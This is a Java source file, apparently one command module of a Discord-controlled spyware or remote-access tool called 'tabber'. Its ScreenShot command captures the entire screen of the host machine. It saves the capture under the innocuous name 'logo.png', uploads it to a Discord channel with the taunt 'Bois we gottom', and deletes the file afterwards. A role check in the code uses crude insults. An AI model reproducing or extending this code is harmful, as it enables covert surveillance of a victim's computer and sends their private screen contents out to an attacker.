package InvisibleCat.tabber.command.commands;


import InvisibleCat.tabber.App;
import InvisibleCat.tabber.command.Command;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Message;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.util.ArrayList;

public class ScreenShot implements Command {
    private String displayMessage;
    private String extra;

    public ScreenShot(String displayMessage) {
        this.displayMessage = displayMessage;
    }

    @Override
    public String extraMessage() {
        return extra;
    }

    @Override
    public String displayMessage() {
        return displayMessage;
    }

    @Override
    public void run(ArrayList<String> args, Member author, Message message) {
        if(App.findRole(author, "bitch") != null && App.findRole(author, "bitch").getName().equalsIgnoreCase("bitch")) {
            extra = "`Error`: Anit-bitch protection has been triggered. So nice try mf";
            return;
        }
        try {
            ss(message);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void ss(Message message) throws Exception {
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture = new Robot().createScreenCapture(screenRect);

        File imageFile = new File("logo.png");
        ImageIO.write(capture, "png", imageFile);
        message.getChannel().sendMessage("Bois we gottom").addFile(imageFile).queue();
        imageFile.delete();


    }
}
